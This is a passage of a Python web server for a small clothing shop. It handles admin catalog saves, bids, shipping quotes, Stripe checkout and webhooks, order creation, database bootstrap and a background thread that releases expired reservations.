        # ---- admin: save the catalog and the pricing ladder ----
        # Both files are written together or not at all. They reference each other by product
        # name, so saving one without the other is how you get a product priced at zero.
        if self.path == "/api/admin/save":
            if not self._authed():
                return
            payload = self._read_json()
            products = payload.get("products")
            pricing = payload.get("pricing")
            costs = payload.get("costs")   # optional: an older dashboard simply won't send it

            problems = validate_catalog(products, pricing)
            if costs is not None:
                problems += validate_costs(costs, products)
            if problems:
                self._send_json({"ok": False, "errors": problems[:25]}, status=400)
                return

            if costs is not None:
                costs = recompute_landed_costs(costs)

            with lock:
                # Back up the projections AND the database, so a bad save is recoverable either way.
                targets = [PRODUCTS_FILE, PRICING_FILE, COSTS_FILE, store.DB_PATH]
                backups = [b for b in (backup_file(t) for t in targets) if b]
                store.save_catalog(products, pricing, costs)
            self._send_json({
                "ok": True,
                "products": len(products.get("products", [])),
                "backups": [os.path.basename(b) for b in backups],
            })
            return

        if self.path == "/api/click":
            payload = self._read_json()
            name = payload.get("name", "") if isinstance(payload, dict) else ""
            if name:
                store.bump_click(name)
            self._send_json({"ok": True})
            return

        if self.path == "/api/bid":
            payload = self._read_json()
            try:
                item = str(payload.get("item", "")).strip()
                amount = float(payload.get("amount", 0))
                name = str(payload.get("name") or "Anonymous").strip()[:40] or "Anonymous"
            except (TypeError, ValueError):
                item, amount, name = "", 0, ""
            if not item or amount <= 0:
                self._send_json({"ok": False, "error": "Invalid bid."})
                return
            with lock:
                current = store.bid_for(item)
                if current and amount <= (current.get("amount") or 0):
                    self._send_json({"ok": False, "error": "Someone already bid higher.", "current": current})
                    return
                now = time.time()
                store.set_bid(item, amount, name, now)
                current_bid = {"amount": amount, "name": name, "time": now}
            self._send_json({"ok": True, "current": current_bid})
            return

        # Shipping for a basket at a real destination. The checkout panel calls this once the
        # buyer has typed a ZIP, so the figure on screen is computed by the same code that will
        # charge the card — not a second implementation in the browser that could drift from it.
        if self.path == "/api/shipping/quote":
            payload = self._read_json()
            items = payload.get("items") if isinstance(payload, dict) else None
            dest_zip = str(payload.get("zip", "")).strip() if isinstance(payload, dict) else ""
            if not isinstance(items, list) or not items:
                self._send_json({"ok": False, "error": "No items."}, status=400)
                return
            requested = [{"id": it.get("id"), "name": it.get("name"),
                          "size": it.get("size"), "qty": it.get("qty")}
                         for it in items if isinstance(it, dict)]
            conn = store.connect()
            try:
                q = orders.quote(conn, requested, dest_zip=dest_zip or None)
            except orders.OrderError as e:
                self._send_json({"ok": False, "error": e.message}, status=409)
                return
            except Exception:
                self._send_json({"ok": False, "error": "Could not price that."}, status=500)
                return
            finally:
                conn.close()
            zone = orders.zone_for_zip(dest_zip) if dest_zip else None
            self._send_json({
                "ok": True,
                "subtotal": q["subtotal_cents"] / 100,
                "shipping": q["shipping_cents"] / 100,
                "total": q["total_cents"] / 100,
                "weight_oz": q["weight_oz"],
                # 'zone' means this is the charged rate; 'estimate' means the flat ladder applied,
                # because the table cannot price this destination yet.
                "source": q.get("shipping_source", "estimate"),
                "zone": zone,
                "zone_group": orders.group_for_zone(zone) if zone else None,
            })
            return

        # ---- Stripe Checkout ------------------------------------------------------------------
        # The browser never sends a price. It sends name/size/qty, the order is created and priced
        # by db/orders.py exactly as the reserve flow does, and the Checkout Session is built from
        # THOSE figures. Stripe is told what to charge by the server, so a tampered cart can change
        # what is ordered but never what it costs.
        if self.path == "/api/checkout/session":
            cfg = stripe_client.load_config()
            if not stripe_client.is_configured(cfg):
                # Deliberately vague to the buyer, specific in the log: the reason names key state.
                print(f"[stripe] checkout refused — {stripe_client.config_problem(cfg)}")
                self._send_json({"ok": False, "error": "Card payment isn't available right now.",
                                 "payments_enabled": False}, status=503)
                return

            payload = self._read_json()
            email = str(payload.get("email", "")).strip().lower() if isinstance(payload, dict) else ""
            items = payload.get("items") if isinstance(payload, dict) else None
            ship_to = payload.get("ship_to") if isinstance(payload, dict) else None
            if not isinstance(ship_to, dict):
                ship_to = {}
            if not EMAIL_RE.match(email or ""):
                self._send_json({"ok": False, "error": "A valid email is required."}, status=400)
                return
            if not isinstance(items, list) or not items:
                self._send_json({"ok": False, "error": "Your cart is empty."}, status=400)
                return

            requested = [{"id": it.get("id"), "name": it.get("name"),
                          "size": it.get("size"), "qty": it.get("qty")}
                         for it in items if isinstance(it, dict)]
            key = str(payload.get("idempotency_key") or "").strip() or None

            conn = store.connect()
            try:
                orders.sweep_if_due(conn)
                try:
                    result = orders.create_order(conn, email, requested, ship_to, idempotency_key=key)
                except orders.OrderError as first:
                    # Same retry-after-sweep rule as /api/order: only stock failures are worth a
                    # second look, and only once an expired hold has actually been released.
                    if not first.detail.get("stock"):
                        raise
                    if not orders.expire_pending(conn):
                        raise
                    result = orders.create_order(conn, email, requested, ship_to, idempotency_key=key)

                order_row = orders.order_by_ref(conn, result["order_ref"])

                # A duplicate submit must not create a second Stripe session for the same order.
                if result.get("duplicate") and order_row and order_row["payment_ref"]:
                    try:
                        existing = stripe_client.api_get(
                            f"/checkout/sessions/{order_row['payment_ref']}")
                        if existing.get("status") == "open" and existing.get("url"):
                            self._send_json({"ok": True, "url": existing["url"],
                                             "ref": order_row["order_ref"], "duplicate": True})
                            return
                    except stripe_client.StripeError:
                        pass    # fall through and make a fresh one

                lines = result.get("lines") or []
                base = cfg["public_url"]
                try:
                    session = stripe_client.create_checkout_session(
                        {"order_id": result["order_id"], "order_ref": result["order_ref"],
                         "shipping_cents": result.get("shipping_cents", 0)},
                        lines,
                        success_url=f"{base}/?checkout=success&ref={result['order_ref']}",
                        cancel_url=f"{base}/?checkout=cancelled&ref={result['order_ref']}",
                        email=email,
                        # Keyed on the order, so a retried POST reuses Stripe's first answer
                        # instead of opening a second session against the same reserved stock.
                        idempotency_key=f"poc-session-{result['order_ref']}",
                        # Taken from the reservation TTL rather than a constant of its own: the
                        # window a buyer can pay in and the window the stock is held for are the
                        # same window, and must stay that way.
                        expires_in=orders.RESERVATION_TTL_SECONDS,
                    )
                except stripe_client.StripeError as e:
                    # The order is holding stock for a payment that can now never happen. Release
                    # it rather than leaving inventory locked up by a failed API call.
                    try:
                        orders.cancel_order(conn, result["order_id"],
                                            reason=f"stripe session failed: {e.message}",
                                            status="failed")
                    except Exception:
                        pass
                    print(f"[stripe] create session failed: {e.message} {e.detail}")
                    self._send_json({"ok": False,
                                     "error": "Could not start the payment. Nothing was charged."},
                                    status=502)
                    return

                orders.attach_payment(conn, result["order_id"], "stripe", session.get("id"),
                                      mode=stripe_client.key_mode(cfg["secret_key"]),
                                      payment_intent=session.get("payment_intent"))
            except orders.OrderError as e:
                self._send_json({"ok": False, "error": e.message, **e.detail}, status=409)
                return
            except Exception as e:
                print(f"[stripe] checkout error: {e}")
                self._send_json({"ok": False, "error": "Could not start the payment."}, status=500)
                return
            finally:
                conn.close()

            store.project_orders()
            self._send_json({"ok": True, "url": session.get("url"), "ref": result["order_ref"],
                             "session_id": session.get("id"),
                             "total": (result.get("total_cents") or 0) / 100})
            return

        # Payment confirmation. This — not the buyer's browser coming back to the success page —
        # is what marks an order paid. A shopper who closes the tab still gets their order; a
        # shopper who hand-types the success URL does not.
        if self.path == "/api/stripe/webhook":
            cfg = stripe_client.load_config()
            length = int(self.headers.get("Content-Length", 0))
            if length > 1024 * 1024:
                self._send_json({"ok": False, "error": "Payload too large."}, status=413)
                return
            raw = self.rfile.read(length) if length else b""
            sig = self.headers.get("Stripe-Signature", "")

            try:
                # Verified against the RAW bytes. Re-serialising the JSON first would change them
                # and break every signature.
                event = stripe_client.construct_event(raw, sig, cfg["webhook_secret"])
            except stripe_client.SignatureError as e:
                print(f"[stripe] webhook rejected: {e}")
                self._send_json({"ok": False, "error": "Invalid signature."}, status=400)
                return

            try:
                handled = self._handle_stripe_event(event)
            except Exception as e:
                # A 500 makes Stripe retry, which is what we want for a transient fault.
                print(f"[stripe] webhook handler error on {event.get('type')}: {e}")
                self._send_json({"ok": False, "error": "Handler error."}, status=500)
                return

            # Anything else gets a 200: an unhandled event type is not a failure, and returning an
            # error would have Stripe retry it for days.
            self._send_json({"ok": True, "handled": handled})
            return

        if self.path == "/api/order":
            payload = self._read_json()
            email = str(payload.get("email", "")).strip().lower() if isinstance(payload, dict) else ""
            items = payload.get("items") if isinstance(payload, dict) else None
            ship_to = payload.get("ship_to") if isinstance(payload, dict) else None
            if not isinstance(ship_to, dict):
                ship_to = {}
            if not EMAIL_RE.match(email or ""):
                self._send_json({"ok": False, "error": "A valid email is required."}, status=400)
                return
            if not isinstance(items, list) or not items:
                self._send_json({"ok": False, "error": "Your cart is empty."}, status=400)
                return

            # Everything the browser sends about money is ignored. Only name/size/qty is honoured;
            # prices, the bulk tier, shipping and the total are recomputed from the database.
            requested = [{"id": it.get("id"), "name": it.get("name"),
                          "size": it.get("size"), "qty": it.get("qty")}
                         for it in items if isinstance(it, dict)]
            key = str(payload.get("idempotency_key") or "").strip() or None

            conn = store.connect()
            try:
                orders.sweep_if_due(conn)
                try:
                    result = orders.create_order(conn, email, requested, ship_to, idempotency_key=key)
                except orders.OrderError as first:
                    # Only a STOCK failure is worth retrying, and only after forcing a sweep. The
                    # throttled sweep above can be skipped for up to a minute, which would let an
                    # expired hold reject a buyer who could actually have been served. Sweeping
                    # unconditionally on every order would be wasteful; sweeping at the exact
                    # moment stock looks short is not.
                    if not first.detail.get("stock"):
                        raise
                    if not orders.expire_pending(conn):
                        raise                       # nothing was holding stock, so the answer stands
                    result = orders.create_order(conn, email, requested, ship_to, idempotency_key=key)
            except orders.OrderError as e:
                self._send_json({"ok": False, "error": e.message, **e.detail}, status=409)
                return
            except Exception:
                self._send_json({"ok": False, "error": "Could not place the order."}, status=500)
                return
            finally:
                conn.close()

            store.project_orders()
            self._send_json({
                "ok": True,
                "id": result["order_id"],
                "ref": result["order_ref"],
                "duplicate": result.get("duplicate", False),
                "subtotal": (result.get("subtotal_cents") or 0) / 100,
                "shipping": (result.get("shipping_cents") or 0) / 100,
                "total": (result.get("total_cents") or 0) / 100,
            })
            return

        if self.path == "/api/subscribe":
            payload = self._read_json()
            email = str(payload.get("email", "")).strip().lower() if isinstance(payload, dict) else ""
            if not EMAIL_RE.match(email):
                self._send_json({"ok": False, "error": "Invalid email."})
                return
            with lock:
                # TODO(resend): once the Resend account/API key are set up, send the
                # "Welcome to Paid Off Clothes" email here — plus new-drop announcements to
                # everyone in the subscribers table going forward. Not wired up yet.
                is_new = store.subscribe(email, time.time())
            self._send_json({"ok": True, "new": is_new})
            return

        self.send_response(404)
        self.end_headers()

    # ---- Stripe event handling -----------------------------------------------------------------
    def _order_for_session(self, conn, obj):
        """Find our order from a Checkout Session, by the three ids it may carry.

        Tried in order of trustworthiness: the reference we set, our own metadata, then the session
        id we stored when the session was created.
        """
        ref = obj.get("client_reference_id")
        if ref:
            row = orders.order_by_ref(conn, ref)
            if row is not None:
                return row
        meta_id = (obj.get("metadata") or {}).get("order_id")
        if meta_id:
            row = conn.execute("SELECT * FROM orders WHERE id=?", (meta_id,)).fetchone()
            if row is not None:
                return row
        if obj.get("id"):
            return orders.order_by_payment_ref(conn, obj["id"])
        return None

    def _handle_stripe_event(self, event):
        """Apply one verified Stripe event. Returns True if it moved an order.

        Idempotency is not implemented here — it lives in payment_events, keyed on the Stripe event
        id, so a redelivered webhook fails the insert and becomes a no-op inside mark_paid /
        cancel_order / refund_order.
        """
        etype = event.get("type", "")
        obj = (event.get("data") or {}).get("object") or {}
        event_id = event.get("id")
        conn = store.connect()
        try:
            if etype in ("checkout.session.completed", "checkout.session.async_payment_succeeded"):
                # A card pays immediately; a delayed method (bank debit) completes the session
                # while still unpaid, and confirms later via async_payment_succeeded. Marking the
                # first one paid would ship goods against money that has not arrived.
                if obj.get("payment_status") != "paid":
                    print(f"[stripe] session {obj.get('id')} completed but unpaid "
                          f"({obj.get('payment_status')}) — waiting for async confirmation")
                    return False

                order = self._order_for_session(conn, obj)
                if order is None:
                    print(f"[stripe] no order matches session {obj.get('id')}")
                    return False

                # The whole point of pricing server-side: what Stripe collected must equal what we
                # computed. A mismatch is never fulfilled automatically.
                if not orders.amount_matches(order, obj.get("amount_total"), obj.get("currency")):
                    print(f"[stripe] AMOUNT MISMATCH on order {order['order_ref']}: "
                          f"stripe={obj.get('amount_total')} {obj.get('currency')} "
                          f"expected={order['total_cents']} {order['currency']} — NOT marking paid")
                    return False

                # An order that has left 'pending' cannot be paid, and retrying will never
                # change that — so this is a 200 with a loud log, not a 500 that Stripe redelivers
                # for days. It also needs a human: the buyer's card may genuinely have been
                # charged for stock that was already released.
                if order["status"] != "pending":
                    if order["status"] in ("paid", "fulfilled"):
                        print(f"[stripe] order {order['order_ref']} is already {order['status']}; "
                              f"event {event_id} ignored")
                    else:
                        print(f"[stripe] *** PAYMENT FOR A {order['status'].upper()} ORDER *** "
                              f"{order['order_ref']}: Stripe collected "
                              f"{(obj.get('amount_total') or 0) / 100:.2f} "
                              f"{obj.get('currency')} on session {obj.get('id')}, but the order was "
                              f"{order['status']} and its stock released. NOT fulfilled "
                              f"automatically — refund it or re-reserve the units by hand.")
                    return False

                orders.set_payment_intent(conn, order["id"], obj.get("payment_intent"))
                res = orders.mark_paid(conn, order["id"], event_id, provider="stripe", payload={
                    "session": obj.get("id"), "payment_intent": obj.get("payment_intent"),
                    "amount_total": obj.get("amount_total"), "currency": obj.get("currency"),
                    "livemode": event.get("livemode"),
                })
                store.project_orders()
                # Say which of the two happened. Stripe redelivers after any non-2xx and after an
                # outage, and payment_events makes the second delivery a no-op — but printing
                # "paid" again reads like a second charge to whoever is watching the console,
                # which is exactly when someone is watching it.
                if res.get("duplicate"):
                    print(f"[stripe] order {order['order_ref']} already paid — "
                          f"redelivered event {event_id} ignored, stock not moved again")
                else:
                    print(f"[stripe] order {order['order_ref']} paid "
                          f"({(obj.get('amount_total') or 0) / 100:.2f} {obj.get('currency')})")
                return True

            if etype in ("checkout.session.expired", "checkout.session.async_payment_failed"):
                order = self._order_for_session(conn, obj)
                if order is None:
                    return False
                status = "failed" if etype.endswith("failed") else "cancelled"
                orders.cancel_order(conn, order["id"], reason=f"stripe: {etype}",
                                    status=status, event_id=event_id)
                store.project_orders()
                print(f"[stripe] order {order['order_ref']} {status}, stock released")
                return True

            if etype == "charge.refunded":
                # A refund names the PaymentIntent, never the session — which is why both ids are
                # stored on the order.
                pi = obj.get("payment_intent")
                order = orders.order_by_payment_intent(conn, pi) if pi else None
                if order is None:
                    print(f"[stripe] refund for unknown payment_intent {pi}")
                    return False
                orders.refund_order(conn, order["id"], event_id, provider="stripe")
                store.project_orders()
                print(f"[stripe] order {order['order_ref']} refunded, stock restored")
                return True

            return False
        finally:
            conn.close()

    def _read_json(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length) if length else b"{}"
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            return {}

    def _send_json(self, obj, status=200):
        body = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format, *args):
        pass


def bootstrap():
    """Prepare DATA_DIR on first boot. Safe to run every time.

    A fresh volume is empty, so the image's starting catalogue and photos are copied in once. On
    every later boot the volume already has them and nothing is overwritten — which is the whole
    point: the deployed shop's data must outlive the image it started from.

    The database half of this must run unconditionally, including a plain local checkout where
    DATA_DIR == APP_DIR: paidoff.db is gitignored, so a fresh clone has no database at all, and
    even an existing paidoff.db file is not proof the schema was ever created in it — any stray
    sqlite3.connect() (a request handled before bootstrap ran, an interrupted earlier attempt)
    creates an empty file with zero tables, which previously made every query fail with
    "no such table" because the whole function returned before touching the database.
    """
    if DATA_DIR != APP_DIR:
        # Photos: seed the shipped ones, then leave the directory alone. Uploads live here.
        img_src, img_dst = os.path.join(APP_DIR, "images"), os.path.join(DATA_DIR, "images")
        os.makedirs(img_dst, exist_ok=True)
        for name in os.listdir(img_src) if os.path.isdir(img_src) else []:
            target = os.path.join(img_dst, name)
            if not os.path.exists(target):
                shutil.copy2(os.path.join(img_src, name), target)

        os.makedirs(os.path.join(DATA_DIR, "backups"), exist_ok=True)

        for name in ("products.json", "pricing.json", "costs.json"):
            s, d = os.path.join(APP_DIR, name), os.path.join(DATA_DIR, name)
            if os.path.exists(s) and not os.path.exists(d):
                shutil.copy2(s, d)

    # Database: build it from the catalogue on disk the first time only. Detected by the schema
    # itself, not file existence, since an existing-but-empty paidoff.db must be treated the same
    # as no file at all — otherwise import_all() (which seeds clicks/orders/bids/subscribers too)
    # never runs and every table stays missing.
    conn = store.connect()
    try:
        has_schema = conn.execute(
            "SELECT 1 FROM sqlite_master WHERE type='table' AND name='products'").fetchone()
        # Every CREATE in schema.sql is IF NOT EXISTS, so this is safe to run unconditionally: it
        # backfills any table a database is missing (e.g. `clicks`, added after some databases were
        # already created) without touching a row that's already there. import_all() is different —
        # it seeds from the JSON files — so that still only runs once, on a genuinely empty database.
        _migrate.init(conn)
        if not has_schema:
            _migrate.import_all(conn)
    finally:
        conn.close()

    # Schema migrations are additive and idempotent, so they run on every boot.
    mig_dir = os.path.join(APP_DIR, "db", "migrations")
    if os.path.isdir(mig_dir):
        conn = store.connect()
        try:
            for fname in sorted(os.listdir(mig_dir)):
                if not fname.endswith(".sql"):
                    continue
                raw = open(os.path.join(mig_dir, fname)).read()
                body = "\n".join(l for l in raw.splitlines() if not l.strip().startswith("--"))
                for stmt in [s.strip() for s in body.split(";") if s.strip()]:
                    try:
                        conn.execute(stmt)
                    except Exception as e:
                        msg = str(e).lower()
                        if "duplicate column" not in msg and "already exists" not in msg:
                            raise
            conn.commit()
        finally:
            conn.close()

    # One-time repair for a database that predates categories.in_products_json (migration 003):
    # ALTER ... ADD COLUMN can only backfill every existing row to the same default (1), which
    # wrongly marks a pricing-only placeholder category (defined in pricing.json but not yet used
    # by any product, e.g. Bags/Shorts) as a real products.json category too. The on-disk
    # products.json still holds the pre-migration truth at this point in boot — the export below
    # hasn't overwritten it yet — so it's used to correct the flag before anything is projected.
    # Idempotent: once corrected, the file this reads back only ever reflects the corrected state.
    if os.path.exists(PRODUCTS_FILE):
        with open(PRODUCTS_FILE) as f:
            cats_in_file = json.load(f).get("categories") or []
        real_categories = set(cats_in_file)
        if real_categories:
            conn = store.connect()
            try:
                rows = conn.execute("SELECT name FROM categories").fetchall()
                known = {r["name"] for r in rows}
                conn.executemany(
                    "UPDATE categories SET in_products_json=? WHERE name=?",
                    [(1 if r["name"] in real_categories else 0, r["name"]) for r in rows],
                )
                # A category can reach products.json without ever reaching the database — most
                # commonly a hand-edit to the file instead of going through the admin dashboard.
                # Without this, the next line below (which regenerates products.json FROM the
                # database) would silently wipe it back out, since the database never learned it
                # exists. Insert it instead, appended after whatever positions are already taken so
                # existing category order is untouched.
                missing = [c for c in cats_in_file if c not in known]
                if missing:
                    next_pos = conn.execute(
                        "SELECT COALESCE(MAX(position), -1) + 1 AS n FROM categories").fetchone()["n"]
                    conn.executemany(
                        "INSERT INTO categories(name, position, bulk_noun, pricing_position, in_products_json) "
                        "VALUES (?,?,NULL,NULL,1)",
                        [(c, next_pos + i) for i, c in enumerate(missing)],
                    )
                conn.commit()
            finally:
                conn.close()

    # Projections last, so the storefront's static JSON matches the database it just loaded.
    conn = store.connect()
    try:
        _migrate.export_all(conn)
    finally:
        conn.close()


def _start_sweeper():
    """Release expired reservations even when nothing is happening.

    The request-path sweep covers a busy shop, but a checkout abandoned overnight would otherwise
    hold its units until someone next visits. A daemon thread makes that self-healing.

    This is a server-side timer touching a local database — not the browser polling the network,
    which is the thing that must never come back (see "Never poll on a timer" in CLAUDE.md).
    """
    def loop():
        while True:
            time.sleep(300)
            try:
                conn = store.connect()
                try:
                    freed = orders.expire_pending(conn)
                finally:
                    conn.close()
                if freed:
                    store.project_orders()
            except Exception:
                pass  # a sweep failure must never take the server down
    t = threading.Thread(target=loop, name="reservation-sweeper", daemon=True)
    t.start()
    return t


if __name__ == "__main__":
    port = PORT
    bootstrap()
    _start_sweeper()
    httpd = http.server.ThreadingHTTPServer(("0.0.0.0", port), Handler)
    print(f"Serving Paid Off Clothes on http://localhost:{port}  (data: {DATA_DIR})")
    httpd.serve_forever()
